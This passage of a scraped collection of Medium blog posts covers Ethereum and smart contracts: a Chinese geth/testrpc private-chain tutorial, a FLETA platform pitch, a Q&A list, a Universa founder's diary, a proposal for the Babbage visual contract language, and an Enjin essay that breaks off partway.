\u4e0a\u9650\uff0c\u7528\u5728\u6e2c\u8a66\u6642\u8abf\u5f97\u6108\u9ad8\u6108\u597d\uff0c  // \u907f\u514d\u6e2c\u8a66\u6642\u64cd\u4f5c\u6642\u82b1\u8cbb\u7684 gas \u89f8\u53ca\u4e0a\u9650\uff0c\u8acb\u53c3\u8003\u6b64\u6587\u3002  \"gasLimit\": \"2000000000000\",  // \u6316\u7926\u7684\u56f0\u96e3\u5ea6\uff0c\u8abf\u4f4e\u4e00\u9ede\u6703\u8b93\u6316\u7926\u901f\u5ea6\u8b8a\u5feb  \"difficulty\": \"1\",  // \u9810\u5148\u6709\u4ee5\u592a\u5e63\u7684\u5e33\u865f\uff0c\u53ef\u4ee5\u5728\u9019\u908a\u9810\u5148\u8a2d\u5b9a\u597d\u67d0\u4e9b\u5e33\u865f\u88e1\u9762\u7684\u4ee5\u592a\u5e63\u6578\u91cf  \"alloc\": {}}\u6709\u4e86 genesis.json \u5f8c\u5c31\u53ef\u4ee5\u7528 geth init \u521d\u59cb\u5316\u5340\u584a\u93c8\uff1a$ geth init genesis.json --datadir privatechainprivatechain \u662f\u4e00\u500b\u4e0d\u5b58\u5728\u7684\u76ee\u9304\uff0c\u57f7\u884c\u4e0a\u9762\u7684\u6307\u4ee4\u5f8c\u6703\u88ab\u5efa\u7acb\u3002\u5efa\u7acb\u5f8c\u5c31\u53ef\u4ee5\u9032\u5165 geth console \uff0c\u5148\u7528 personal.createAccount('') \u5efa\u7acb\u5e33\u865f\u4e26\u4e14\u7528 miner.start() \u958b\u59cb\u6316\u7926\u4ee5\u53ca miner.stop() \u505c\u6b62\u6316\u7926\u3002// networkid \u662f\u7528\u4f86\u4ee3\u8868\u9019\u500b network \u7684\u4ee3\u78bc\uff0cmainnet \u662f 1// \u9084\u6709\u4e00\u4e9b\u6e2c\u8a66\u7db2\u8def\u5728 2~4 \u4e4b\u9593// \u6e2c\u8a66\u6642\u5c31\u4f7f\u7528\u4e00\u500b\u5927\u4e00\u9ede\u7684\u6578\u5b57\u5982 123 \u6216 10000 \u5c31\u884c\u4e86$ geth --networkid 10000 --datadir privatechain console// \u65b0\u589e\u4e00\u500b\u9322\u5305\u5730\u5740> personal.newAccount('')// \u958b\u59cb\u6316\u7926> miner.start()// \u7b2c\u4e00\u6b21\u6316\u7926\u6703\u6709\u9019\u500b\u8a0a\u606f\uff0c\u8dd1\u500b\u5e7e\u5206\u9418\u5f8c\u5c31\u6703\u958b\u59cb\u6316\u7926\u4e86\u3002INFO [08-09|19:00:53] Generating DAG in progress               epoch=1 percentage=0 elapsed=2.953s// \u9019\u908a\u7684\u8a0a\u606f\u4ee3\u8868\u958b\u59cb\u6316\u5230\u7926\u4e86INFO [08-09|19:01:02] \ud83d\udd28 mined potential block                  number=9 hash=476c02\u2026e3084eINFO [08-09|19:01:02] Commit new mining work                   number=10 txs=0 uncles=0 elapsed=275.342\u00b5sINFO [08-09|19:01:03] Successfully sealed new block            number=10 hash=3788e4\u2026eda782// \u505c\u6b62\u6316\u7926miner.stop()\u9019\u6642\u7528\u4e0b\u9762\u7684\u6307\u4ee4\u5c31\u53ef\u4ee5\u770b\u5230\u76ee\u524d\u7684\u4ee5\u592a\u5e63\u6709\u591a\u5c11\uff0c\u4e5f\u53ef\u4ee5\u7528\u5176\u4ed6\u5404\u5f0f\u5404\u6a23\u7684\u6307\u4ee4\u3002> eth.getBalance(eth.accounts[0])285000000000000000000\u4f7f\u7528 testrpctestrpc \u662f\u4e00\u500b node.js \u6a21\u7d44\uff0c\u6a21\u64ec\u4e86\u4e00\u500b ethereum client \u7684\u884c\u70ba\u8b93\u5728\u958b\u767c\u6642\u53ef\u4ee5\u4e0d\u7528\u5728\u771f\u7684\u5340\u584a\u93c8\u4e0a\u8dd1\u3002\u7528\u4ee5\u4e0b\u6307\u4ee4\u5b89\u88dd\uff1a$ npm install -g ethereumjs-testrpc\u5b89\u88dd\u5b8c\u4ee5\u5f8c\u5c31\u53ef\u4ee5\u7528\u4ee5\u4e0b\u6307\u4ee4\u555f\u52d5\uff1a$ testrpc\u9019\u6642 testrpc \u6703\u5efa\u7acb\u4e00\u4e9b\u5e33\u865f\uff0c\u4e26\u4e14\u65b0\u589e\u4e00\u4e9b\u6e2c\u8a66\u7528\u7684\u4ee5\u592a\u5e63\uff0c\u6700\u5f8c\u9762\u6709\u500b\u7db2\u5740\u53ef\u4ee5\u4f7f\u7528 geth console \u9023\u5165\uff0c\u9019\u6574\u500b\u7db2\u8def\u90fd\u662f\u6a21\u64ec\u7684\uff0c\u4e26\u4e0d\u662f private chain\uff0c\u53ea\u662f\u4e00\u500b\u6a21\u64ec\u7db2\u8def\u63d0\u4f9b\u958b\u767c\u8005\u6e2c\u8a66\u7684\u6a21\u7d44\u3002\u958b\u555f\u53e6\u5916\u4e00\u500b terminal\uff0c\u8f38\u5165\u4ee5\u4e0b\u6307\u4ee4\u5c31\u53ef\u4ee5\u9023\u9032\u53bb testrpc \u6240\u5275\u5efa\u7684\u6a21\u64ec\u74b0\u5883\u4e86\u3002$ geth attach http://localhost:8545\u7d50\u8a9eEthereum \u76ee\u524d\u5728\u4e00\u500b\u9032\u5c55\u975e\u5e38\u5feb\u7684\u968e\u6bb5\uff0c\u7db2\u8def\u4e0a\u7684\u6587\u4ef6\u751a\u81f3\u5b98\u65b9\u7684\u6559\u5b78\u90fd\u5f88\u6709\u53ef\u80fd\u904e\u6642\u3002\u5728\u6211\u5617\u8a66 Smart Contract \u7684\u9019\u6bb5\u6642\u9593\uff0c\u9047\u5230\u4e86 Faucet Service \u6c92\u8fa6\u6cd5\u767c\u51fa\u9322\uff0c\u53c8\u9047\u5230\u4e86 Mist / geth \u82b1\u8cbb\u592a\u4e45\u7684\u6642\u9593\u540c\u6b65\u5340\u584a\uff0c\u6700\u5f8c\u53c8\u9047\u5230\u6b63\u597d geth\u628a web3.eth.compile.solidity() deprecated \u6389\u3002\u8eab\u70ba\u4e00\u500b\u525b\u5165\u5340\u584a\u93c8\u7684\u4eba\uff0c\u89ba\u5f97\u5165\u9580\u7684\u9580\u6abb\u53cd\u800c\u662f\u9019\u4e9b\u9ad8\u901f\u9032\u5c55\u800c\u4e0d\u77e5\u9053\u54ea\u4efd\u6587\u4ef6\u53ef\u4ee5\u53c3\u8003\u7684\u60c5\u6cc1\u3002\u4e0d\u904e\u9019\u7a2e\u72c0\u6cc1\u5927\u6982\u6703\u96a8\u8457 Ethereum \u7684\u7a69\u5b9a\u5c31\u6bd4\u8f03\u4e0d\u6703\u6709\u9019\u6a23\u7684\u72c0\u6cc1\u4e86\u3002\u4e0a\u6b21\u53bb\u4e86 Taipei Ethereum Meetup \u89ba\u5f97\u771f\u7684\u5f88\u6709\u5e6b\u52a9\uff0c\u679c\u7136\u8ddf\u5df2\u7d93\u5728\u73a9\u7684\u4eba\u804a\u804a\u53ef\u4ee5\u7372\u5f97\u5f88\u591a\u65b0\u77e5\u3002\u6709\u8208\u8da3\u7684\u4e5f\u53ef\u4ee5\u7dda\u4e0a\u6216\u4f86\u5be6\u9ad4\u805a\u6703\u53c3\u52a0\u9019\u500b\u793e\u7fa4\uff01Taipei Ethereum Meetup\u5c08\u6ce8\u5728 Ethereum \u6280\u8853\u7406\u8ad6\u3001\u5be6\u4f5c\u3001\u8207\u61c9\u7528\u7684\u8a0e\u8ad6\u793e\u7fa4\uff0c\u76ee\u524d\u6bcf\u6708\u7531\u793e\u7fa4\u53c3\u52a0\u8005\u81ea\u9858\u5206\u4eab\u3002 Ethereum \u662f\u5177\u6709\u667a\u6167\u5951\u7d04\u529f\u80fd\u7684\u5340\u584a\u93c8\u5e73\u53f0\u3002 We like use Ethereum and blockchain\u2026www.meetup.com", "responses": "3"}, {"title": "The Developer Comes First; How FLETA is Different from Major Smart Contract Platforms", "author_name": "FLETA Blockchain", "link": "https://medium.com/fleta-first-chain/the-developer-comes-first-how-fleta-is-different-from-major-smart-contract-platforms-da65a0caff17?source=search_post", "post_date": "Jan 30", "readtime": "6 min read", "upvotes": "1.8K", "content": "The Developer Comes First; How FLETA is Different from Major Smart Contract PlatformsFLETA BlockchainBlockedUnblockFollowFollowingJan 30Several major blockchain platforms such as Ethereum and EOS are vying to become the Google Android and Apple iOS of the blockchain market. They both, however, possess inherent flaws that may hinder and hold them back from doing so.Bluntly put, these projects make it expensive for developers to create and run their decentralized applications (DApps) on top of their blockchain platforms. FLETA solves to resolve the issues inherent in Etherum\u2019s GAS and expense for using smart contracts whilst also eliminating the need for developers to stake EOS tokens resulting in large upfront costs.FLETA seeks to provide the ideal blockchain application and smart contract platform solution for anyone who is seeking to create, deploy, and run decentralized applications.The Value of Smart Contract PlatformsThe value of a smart contract platform is tied to the number of developers actively building on the platform, along with the number of users of the live DApps on the platform. This is why it is crucial for smart contract platforms to attract developers and on FLETA\u2019s platform great incentives are provided to developers and users alike. With FLETA, developers also have more flexibility and ease of development as multiple programming languages are supported to include, Solidity, JavaScript, and Golang (with more supported languages to be added).Instead of overburdening users with GAS, and requiring developers to pay high up-front fees with staked tokens, FLETA provides an alternative solution that is reasonable, affordable, and developer friendly.In FLETA, developers can choose whether or not to utilize FLETA\u2019s technology support services, and if they do choose to use the services, costs are only incurred based on usage.Flexibility and\u00a0ChoiceFLETA will offer a Technology & Business Support Service to all developers within the FLETA ecosystem to allow them to develop their own DApps and run their operations smoothly.Further services provided by FLETA for DApp developers are available if they wish to engage in such services. In these cases, reasonable costs are charged that are proportioned to the usage of the service (more details provided below).The Development and DApp Costs of Ethereum and\u00a0EOSAs a comparison, we can take a look at roughly how much it costs to create and run decentralized applications on top of Ethereum and EOS.Ethereum Smart Contract\u00a0CostsIn Ethereum, users must pay gas fees for the execution of transactions through a smart contract. Executing smart contracts come with a minimum fee of 32000 gas, plus 200 gas per byte of source code, as outlined in Appendix G of Ethereum\u2019s yellow paper.As has been estimated, The estimated gas costs for the execution of an Ethereum smart contract conducting ~1,000,000 transactions a year roughly equals 90 ETH or ~$10,600 USD (as of writing this article) every year.Developers are not required to pay these fees directly, instead the costs are passed onto users who are required to pay to interact and use the DApps or smart contracts to send transactions. This ultimately means users bear the burden of the gas costs and fees, and if an application is deemed to be too expensive, users will likely turn to cheaper alternatives. Take note that the total gas expense and cost will increase in proportion to the increase in value of ETH, so if Ethereum increased by a multiple of 5, gas fees would roughly equal $53,000 USD a year.EOS Development CostsIn contrast to Ethereum, gas prices don\u2019t need to be paid on EOS. Instead, EOS tokens must be staked in order to receive resources such as Bandwidth, CPU, and storage for a developer\u2019s smart contract. Along with this, developers are still required to pay for RAM. Since RAM is a rare resource, it needs to be bought from an internal RAM marketplace on EOS and according to the EOS resource planner, 1 MB RAM will cost 59 EOS or $139 (as of writing this article).With this information in mind, let\u2019s see how much EOS will need to be staked in order to run an application. Assuming the application has 1000 users (which is a conservative estimate).Developers will need to\u00a0:Pay for each users account, which is 4 KB RAM per userPay for their storageAccount for the network bandwidth and CPU bandwidth for running the DApp.Factoring all of this together, it is estimated that the deployment and running costs for a 1000 user application on EOS will equal roughly 10628 EOS, or $25,500 (at time of writing).FLETA Development CostsLet\u2019s now consider how FLETA differentiates itself as a blockchain platform for the development, running, and maintenance of DApps, along with how FLETA\u2019s costs fair in comparison.1. DApps Operate Their Own Independent ChainEach independent chain in FLETA\u2019s multi-chain structure represents a DApp that has its own native token that provides utility to users and also rewards miners.Each independent chain that is led by the \u201cDApp manager\u201d can create their own token economies by choosing how the chain is governed in terms of its mining algorithm, transaction fees (they can choose none at all), and block reward model for miners.Coming back to the notion of flexibility and choice, developers have a great deal of it when they choose to launch their DApps on FLETA\u2019s platform.2. Formulator Generator ServiceIf developers would rather not purchase expensive hardware to run miners for their chain (or pay large upfront staking fees) they can pay for FLETA\u2019s \u201cFormulator Generator Service\u201d that supplies formulator nodes (miners) for their subchain.The fee for this service will be set at reasonable market rates and can be paid in \u20a9, BTC, ETH, or FLETA tokens. (All purchases in FLETA tokens are given a significant discount.)3. Additional Developer ServicesInterchain Connection Service: If developers seek to connect their DApp to other DApps on FLETA\u2019s platform, an interchain connection service is available for doing so.Fees for this service are very reasonable and vary based on the frequency of usage. The fee is a monthly payment and can be paid only using FLETA tokens. If there is no requirement to connect with other sub chains in FLETA\u2019s network, this cost is not passed on.Development Support and Automation of Operation Service: A nominal fee for technological services paid for in FLETA tokens will also provide developers with on-going support through the creation of an optimal development environment.ConclusionTo summarize, FLETA provides developers a platform which is more flexible and affordable than Ethereum and EOS. The formulator generator service ensures developers aren\u2019t required to pay astronomical gas or staking fees if they do not wish to. On top of this, developers also have the option to choose whether or not to utilize FLETA\u2019s additional services, and if they do, they are only charged based on usage at reasonable rates. By empowering developers, FLETA provides great incentives for more decentralized applications to be built on top of our platform.The details about specific fee amounts are being finalized and will be released to the public upon the launching of the mainnet.If you would like to learn more, you can chat with us through Telegram, visit our website, and read our white paper and tech paper.", "responses": "2"}, {"title": "Can a Smart Contract be upgraded/modified? Is CPU mining even worth the Ether? The Top questions answered\u00a0here\u2026", "author_name": "Merunas Grincalaitis", "link": "https://medium.com/ethereum-developers/can-a-smart-contract-be-upgraded-modified-1393e9b507a?source=search_post", "post_date": "Feb 6, 2018", "readtime": "9 min read", "upvotes": "390", "content": "Can a Smart Contract be upgraded/modified? Is CPU mining even worth the Ether? The Top questions answered\u00a0here\u2026Merunas GrincalaitisBlockedUnblockFollowFollowingFeb 6, 2018In this article I\u2019m solving several of the most important questions people are having when it comes to understanding Ethereum. Most of them come from ethereum.stackexchange.com. And the purpose of this article is to have a nice, organized list that you can always reference to fulfill your Ethereum curiosity.Feel free to let me know any other questions you have and I\u2019ll add them to the list to help each other out. Let\u2019s get to it.Here\u2019s the list of questions. Just go to the question number by scrolling down:1. How can I check if an Ethereum address is valid?2. Is CPU mining even worth the Ether?3. Where does the consumed ether/gas go?4. How do I buy Ethereum with USD?5. What is the difference between a transaction and a call?6. Can a Smart Contract be upgraded/modified?7. I sent ETH ether to an ETC address, can I recover the ether?8. What\u2019s the difference between proof of stake and proof of work?9. Why does Ethereum plan to move to Proof of Stake?10. What number of confirmations is considered secure in Ethereum?Bonus: How to create a Dapp from scratch on Ethereum?", "responses": "2"}, {"title": "UTN Smart Contract, Khanty-Mansiysk // North\u00a0Dubai", "author_name": "Alexander Borodich", "link": "https://medium.com/universablockchain/utn-smart-contract-khanty-mansiysk-north-dubai-89ba25285bda?source=search_post", "post_date": "Jun 17, 2018", "readtime": "7 min read", "upvotes": "2.1K", "content": "UTN Smart Contract, Khanty-Mansiysk // North\u00a0DubaiAlexander BorodichBlockedUnblockFollowFollowingJun 17, 2018Took part in a conference and delivered a presentation on using Universa Blockchain for charity foundations and non-profits (Session titled \u201cInnovations and Technologies for the Children of Russia\u201d)Discussed the opportunities of implementing blockchain technology in \u201cNorthern Dubai\u201d\u200a\u2014\u200athat\u2019s what they call Khanty-Mansiysk here\u200a\u2014\u200awith the regional administration (Deputy Governor Alexey Zabozlaev)Read a lecture on how blockchain will change the professions of the future for schoolchildren and students from Khanty-Mansi Autonomous OkrugNight flights are our everythingWe flew back late at night and jumped straight into action \ud83d\ude03We met representatives of several Arab banks, formulated the prospects and options of cooperation. Agreed to do a presentation at a specialized banking forum in Paris in late June.Met Sergey Bezdelov and ANO \u201cDigital Economy Projects Rating Agency (http://reurating.ru). Discussed the prospects for cooperation and Universa Blockchain participation in the Agency work.Met Dennis Bucko, head of AMBD.io (http://ambd.io), discussed the future of the ICO market and ways Universa, as a blockchain technology provider, can support projects approaching ICOHad a reception with the Swedish Ambassador, celebrating the 10th anniversary of our MBA group graduating from the Stockholm School of Economics. I shared the Universa success with my classmates; we will be making friends with their projects.Negotiated with the systems integrator Asseco Group (https://asseco.com) regarding cooperation on Universa Blockchain implementation projects in the banking and insurance sectors in the Euroepan countries.Had negotiations with the management of TechGarden Kazakhstan (https://techgarden.kz), agreed on joint project work in the area of blockchain.AmsterdamING Bank + Universa Blockchain = Secure Blockchain Solutions for\u00a0bankThe visit to Amsterdam opened with a meeting with ING Bank (https://www.ing.com/Home.htm). We talked about the possibility of the bank implementing projects using the Universa Blockchain. I will be glad if such a reputable bank will eventually choose our technology. Let\u2019s keep our fingers crossed \ud83d\ude09EY building in AmsterdamNext we headed for a meeting with EY (http://ey.com), where we also discussed the prospects of future cooperation. Ideally, EY should be able to describe a case for the customer, with a little help from our side, and the systems integrator would implement it\u200a\u2014\u200aagain, with our help. This way, we can complete many more projects than we would be able to do on our own. This way we are taking up market share in Europe, Asia and Africa.And finally, after these important and highly relevant meetings, we had the first official meetup for our Dutch community since the Token Sale moment.At the meetup I described our latest achievements, described the strategy for entering new markets, and explained why Universa will continue growing and developing under any circumstances. \ud83d\ude03Night flight to\u00a0Moscow.In the morning, following a short break, I headed to Skolkovo to meet GazPromNeft representatives and discuss the prospects for tokenization of their current business.Along the way, I met Yury Mitin and promised him to talk about Universa Blockchain case at the conference in Skolkovo, from the first concept of the project to present day.After the meeting, I rushed back to Moscow to meet some prospective investors to Universa and discuss the format, size and guarantees of the prospective investment.Next morning we had journalists filming a story in our office, while I hurried up to meet a large fund manager eager to invest in Universa Blockchain-based projects. We talked about the best financial arrangement to structure the process.Met the team, interviewed new team members and had lots of other boring work stuff. \ud83d\ude03Had an important meeting with the management of a company in the aviation industry. Now we will painstakingly prepare the paperwork and announce another joint project.I attended a blockchain conference in Skolkovo, outlining the history of our project, all its challenges and stumbling blocks and the capacity of the market in general, our niche in particular and our specific positioning ideology as a solution without mining and without tying the transaction cost to a cryptocurrency. I think the conference will result in a couple of Universa-based project implementations \ud83d\ude03 The lecture was a time well spent.Finally, a very critical presentation at the Skolkovo Corporate University, where I would be speaking right after Kjell Nordstr\u00f6m (https://en.wikipedia.org/wiki/Kjell_A._Nordstr\u00f6m) and Herman Gref (https://en.wikipedia.org/wiki/Herman_Gref). It was a challenging moment, but I was told the audience was satisfied. We discussed some future trends and how the cities, moneys and relations we got so used to will change with the advent of new decentralized technologies. When decisions are made not by corporations but by billions of uBots\u200a\u2014\u200asoftware robots (smart contracts) spread throughout the network, including Universa-based smart distributed contracts.#DevelopmentUniclientImplemented safe file handling mode, which prevents overwriting file contentsAdded revisionsFixed wallet aggregationAdded split/join, with full supportFixed and updated\u200a\u2014\u200aimport (revision-of),\u200a\u2014\u200apack-with (add-referenced)Improved network operations, with more complete contract data outputJava API/developers supportJavadoc: documented an important code part that is vital for customer applicationsKnowledge Base\u200a\u2014\u200asubstantially expanded the developers\u2019 section: https://kb.universa.io/software_developer_central/32Code samples: ContractService classAdded search within documentationFor documentation: added the possibility of splitting sections between pages (structured editing tools)Universal Scala API early preview readyUniversal API is meant to be same in JMV/Scala.js platforms to provide high degree of scala code interoperability between end user UX applications (browser) and server applications (JVM)NodeNetwork upgraded to v.3.4.14Arbitrary attributes in transactional sectionReferences to transactional attributes (e.g. special purpose payments amd many other interesting applications)UNS1 contract fixedFixed several problems with permission conflicts.JavaScript/ScalaJS APIJS API Alfa is published (as compiled JSON) and available, preparing yarn dependecy supportScala.js API alfa early preview readyWebClient 2.0Started closed beta test, most functionality now works with itWebClient 1.*More functions are allowed without buying UWeb Integration API:Allows any 3rd pty services securely emit contracts (tokens) using Universa web client: https://kb.universa.io/web_client_integration/55Started beta testUTN Smart\u00a0ContractFinally, icing on the cake\u200a\u2014\u200ayou must have read the news about UTN Smart Contract already. (https://medium.com/universablockchain/important-update-on-the-utn-smart-contract-token-distribution-and-future-swapping-of-tokens-dd3a1f4bb8df)Meet the smart contract that will store our UTN: http://lnd.im/utnA transcript of the creation of UTN\u200a\u2014\u200aUniversa Token on the Universa ExplorerIf you are really curious to see the source code, you can download the binary file of the contract right from the explorer, and generate the source code yourself! In order to do that, you should do the following:\u2022 Get the Uniclient from https://lnd.im/uniclient; see the manual at https://kb.universa.io/uniclient_user_manual/4;\u2022 Having downloaded the contract into a file like \u201cUTN - Universa Token.unicon\u201d from the URL to the Universa Explorer above, call the following command:\u00a0./uniclient --export UTN\\ -\\ Universa\\ Token.unicon --as yaml(Unix/macOS/Linux) or uniclient.bat --export UTN\\ -\\ Universa\\ Token.unicon --as yaml (Windows).Voila, you now have the \u201cUTN - Universa Token.yaml\u201d file, and you can now examine its structure! (Pro hint: look at the https://kb.universa.io/uniclient_user_manual/4#export-a-contract-to-xml-json-or-yaml section and learn how to view it in other formats as this may be more convenient to you).Next to \u201cUnixchange private cloud.\u201d you can click \u201c(download)\u201d to obtain the UTN Smart Contract in its binary formStay tuned!We are always happy to answer your questions in the Telegram channel\u200a\u2014\u200at.me/uplatform (EN) and t.me/universa (RU).Follow the news in t.me/UniversaNews (EN) and t.me/UniversaNewsRu(RU).Sincerely yours, Paranoid CEO, Alexander Borodich", "responses": "31"}, {"title": "Babbage\u200a\u2014\u200aa mechanical smart contract\u00a0language", "author_name": "Christian", "link": "https://medium.com/@chriseth/babbage-a-mechanical-smart-contract-language-5c8329ec5a0e?source=search_post", "post_date": "May 16, 2017", "readtime": "6 min read", "upvotes": "269", "content": "Babbage\u200a\u2014\u200aa mechanical smart contract\u00a0languageChristianBlockedUnblockFollowFollowingMay 16, 2017Smart contract programming languages should be easy to understand and unambiguous. Usually, such languages are written in formal computer languages comprised of expressions, operators, functions and variables. While they are already quite abstract and hard to understand because of that, the fact that components of a smart contract can be referenced by name partly from anywhere in the program sometimes makes it almost impossible to see how different parts interact and fit together.We propose a language that is situated at a level where even untrained people are able to grasp it. Babbage is a visual programming language that consists of simple mechanical parts that interact with each other: Pipes, valves, rods and levers. Since components that want to interact with each other have to be physically close, the modularity of such systems is already guaranteed by design. Furthermore, people with no knowledge of programming languages have the chance to understand complex smart contracts.There is an analogy between smart contract on Ethereum and a vending machine made of glass, put at a public place: Once it is created, it is not possible to modify it, except by pushing the buttons that are mounted at its exterior. Furthermore, everyone has the possibility to watch how it works internally. Note that open source software installed on cloud computers is similar, but there is still an important difference: You can take a look at the published source code, but you have no way to tell whether the server actually runs the same code. This is similar to a vending machine not made of glass: You can look at the blueprints, but you never know what the machine actually does.If the machine is made of glass, it is (depending on its complexity) quite easy to see what will happen if you put a coin inside and then push a button. You can even see if the drink you want to buy is still available. Software running on servers tries to achieve a similar effect using easy to understand user interfaces, but in the end, you never know what will happen when you actually press a button labelled buy on a website.We want to take this analogy further and build actual machines inside Ethereum. The benefits are that humans should be able to figure out how a mechanical machine works without much prior knowledge. Furthermore, it should be quite easy to see any possible way in which a switch (a variable in text-based programming languages) can be modified, because there has to be a physical connection to that switch. Finally, as Ether is modeled as a liquid flowing in pipes, you can directly see where it will go.Also note that (software) engineers often resort to diagrams when they want to explain something. Admittedly, diagrams often simplify things and thus, a mechanical smart contract language might not be as expressive as a text-based language, but on the other hand, mechanisms that are so complex that they cannot be fully explained using a diagram should perhaps not be used for smart contracts anyway.Let us start with an example. A smart contract that distributes all Ether sent to it equally among two addresses can be seen in Figure 1. The dashed outer line delimits the smart contract. Anything that comes from the environment or influences the environment has to cross the dashed line. Ether is a purple liquid that flows in pipes which always have a flowing direction. The smart contract has no way to store Ether, everything is just forwarded. Ether comes in at the top, at the entry that is unmarked. The exits at the bottom are labelled by addresses, so the Ether is forwarded to those addresses. Since there is no mechanism that could change the labels, these connections are permanent. The most interesting part of the smart contract is the splitter in the middle. It has an indicator that tells how much of the input Ether goes to the left exit and how much goes to the right exit. To help reading the indicator, the exact percentages are also written in numbers.Figure 2: Smart contract that distributes all Ether sent to it among two addresses with a ratio modifiable from a certain\u00a0address.Let us now look at an extension of this simple splitter, the adjustable splitter, which can be seen in Figure 2. This contract has a small button or lever at the outside and an address written next to it telling that only this address is allowed to manipulate the button.The basic idea of Babbage is to provide multiple gadgets that can be combined with each other, but only snap together in certain combinations. The final smart contract that is executed on the Ethereum Virtual Machine will of course not do a full physics simulation as that would be too expensive. Instead, the IDE will translate gadget combinations into smart contract code. At the same time, the IDE will make sure that unintended physical interactions like collisions between moving rods or levers are not possible. This is important since such collisions would not be modelled by the smart contract, but at the same time, humans looking at the diagram could expect them to actually happen. In general, all gadgets should be as simple and intuitive as possible. The examples provided in this document probably do not yet achieve the desired level of simplicity, but they provide a perspective on the general idea.Figure 3: Escrow mechanism that first requires two parties to deposit the same amount of Ether and then allows payouts to be performed in different ways by the parties. The circles are valves that change their opened / closed state by actuating them and the gadgets an the top of the tanks are float switches.The final example in Figure 3 shows an escrow contract. The idea behind this mechanism is that one person, Alice, wants to sell an item to another person, Bob. The payment should happen via the Ethereum network, but the item has to be sent via parcel from Alice to Bob. Alice deposits the value of the item into the smart contract. As long as Bob does not yet do the same, Alice can still drain the contract. Once Bob put his Ether in, the contract is locked in the following sense:The only option available to Bob is to trigger a mechanism in the contract that will send all Ether in the contract to Alice. Bub would use this when he receives the item and thus performs the final payment.The only option for Alice is to trigger a mechanism that will refund both Alice and Bob. This should be used in a situation where something went wrong with the parcel or Bob returned the item.When analysing the diagram, note that Ether always flows according to the arrows and if an interaction with a smart contract triggers something inside the contract to move (or flow), the next interaction is only possible once everything stopped moving. Furthermore, pipes cannot store Ether (you can think of pipes as not having any internal volume), so Ether either has to move through the pipes completely and end up in some kind of reservoir or not enter the pipes at all. Red wires can carry single impulse signals and only in the direction indicated by the arrows.Let us go through the full escrow mechanism. In the top-centre we have two identical tanks that can both store 10 Ether. Each of the tanks has two drains which are closed by valves in the beginning. Both Alice and Bob can open their valve and get their Either back. At the top of each tank is a float switch that activates a signal that travels along the red wires to a valve at the centre drain pipe. This mechanism ensures that as soon as both tanks are filled, they are automatically drained into the bottom tank. Note how the two sequential valves act as an and gadget. Also note that both of the tanks can be filled and drained multiple times as long as the other tank is not completely filled.Once the Ether reached the second tank, Alice only has the option to open the valve attached to the right drain pipe and refund both Alice and Bob. On the other hand, Bob only has the option to open the left valve, thus sending all Ether to Alice and paying for the purchase this way.One thing that is immediately obvious from the diagram is the symmetry of interaction between the parties. Everything is fully symmetric apart from the actual payout section. For textual programming languages, such properties are only visible after careful inspection of the source code.For now, this is just a fun idea, but hopefully, this can be extended to support a wide variety of other gadgets that are all easy to understand. Please contact me at chris@ethereum.org if you have any ideas or want to contribute!", "responses": "5"}, {"title": "The Smart Contract War & Why Ethereum Will Win It: A Guide to Making ETH Ubiquitous", "author_name": "Ilija Rolovi\u0107", "link": "https://blog.enjincoin.io/the-smart-contract-war-why-ethereum-will-win-it-a-guide-to-making-eth-ubiquitous-17e9c0e456f4?source=search_post", "post_date": "Aug 13, 2018", "readtime": "13 min read", "upvotes": "1.93K", "content": "The Smart Contract War & Why Ethereum Will Win It: A Guide to Making ETH UbiquitousCombine a partnership with the world\u2019s biggest game development engine with a revolutionary Ethereum scaling solution, create a new token standard, focus on user experience, have an ace or two in your pocket\u200a\u2014\u200aand marvel as the floodgates to mass adoption\u00a0open.Ilija Rolovi\u0107BlockedUnblockFollowFollowingAug 13, 2018\u201cThe spread of civilization may be likened to a fire; first, a feeble spark, next a flickering flame, then a mighty blaze, ever increasing in speed and\u00a0power.\u201d\u2014 Nikola\u00a0TeslaOne hundred and forty years ago, Thomas Edison and Nikola Tesla waged a decade-long battle that would later be inscribed into the pages of history as the \u201cWar of the Currents.\u201dEdison played dirty when promoting his direct current, spreading constant FUD regarding Tesla\u2019s alternating current and going as far as electrocuting an elephant in order to spread fear and doubt about Tesla\u2019s invention. The Serbian-American inventor ultimately won, as alternating current gained mass adoption due to its superior technical characteristics.One can\u2019t help but draw an analogy between this and what\u2019s been going on in the blockchain industry for a while now\u200a\u2014\u200aan all-out conflict between Ethereum and other projects attempting to replace it as the dominant smart contract platform.While spreading fear, uncertainty, and doubt and boasting about solving Ethereum scalability problems may help their competitors damage Ethereum in the short run, I believe that superior technology always prevails. I\u2019ve already written about this in one of my previous articles.It\u2019s a tale as old as the dawn of the blockchain era: to achieve scalability, you must sacrifice decentralization and security. But if you do, then sorry\u200a\u2014\u200ayou are no longer to be trusted.That\u2019s the whole point of this new venture undertaken by a tiny percentage of our species\u200a\u2014\u200ato create a trustless system. Replacing my bank that runs their data on a single server with a tiny number of plutocrats that can wipe out my assets at a whim is not an optimal solution\u2014or one that I (or anyone else) would opt-in for.Governance, Part 2: Plutocracy Is Still BadCoin holder voting, both for governance of technical features, and for more extensive use cases like deciding who runs\u2026vitalik.caThe Smart Contract War will rage on for a while\u200a\u2014\u200aand the Enjin team picked a side a long, long time ago.Our reasoning is simple: in much the same way AC is superior to DC, Ethereum is superior to everything else. The colossal number of Ethereum projects, developers, and miners is a symptom of its technological and philosophical superiority.The technology is better\u200a\u2014\u200anumbers reflect it.We are strong believers in the ETH ecosystem.Decentralization and security cannot be sacrificed\u200a\u2014\u200athey are the last line of defense and are at the very core of what blockchain technology is.We\u2019re ready, we\u2019re determined (albeit sleep-deprived), we\u2019re badass\u200a\u2014\u200aand we\u2019re armed to the teeth with everything from an ultra-secure Ethereum & ERC-20 wallet to a pioneering scaling solution.We\u2019ve also launched a blockchain-powered ICBM in the form of our Blockchain SDK for Unity.Now, let me tell you all about our plan to help Ethereum win the Smart Contract War.Step 1: Find a Use\u00a0CaseWhile Warcraft I wasn\u2019t the first video game I ever played, it\u2019s the first one I vividly remember.Twenty-two years ago, my dad\u2019s best friend brought us that game on a floppy disk. Our long-obsolete CRT monitor showed us the pixelated continent of Azeroth and its two races locked in a seemingly eternal war.Video games have come a long way since 1996.I\u2019m not going to bore you with numbers and talk about the gaming industry\u200a\u2014\u200ayou\u2019re likely aware that it\u2019s bigger than the movie and music industries combined. Instead, I want to talk about the people that are the part of the gaming world: developers and gamers.The architects of the worlds that never were and the adventurers who explore them.There\u2019s a really good argument to be made that blockchain will see its first mainstream adoption in the gaming industry.Problems facing both gamers and game developers are many\u200a\u2014\u200aand in this particular case, blockchain technology is perfectly suited to address those problems for both groups.There is a real need for smart 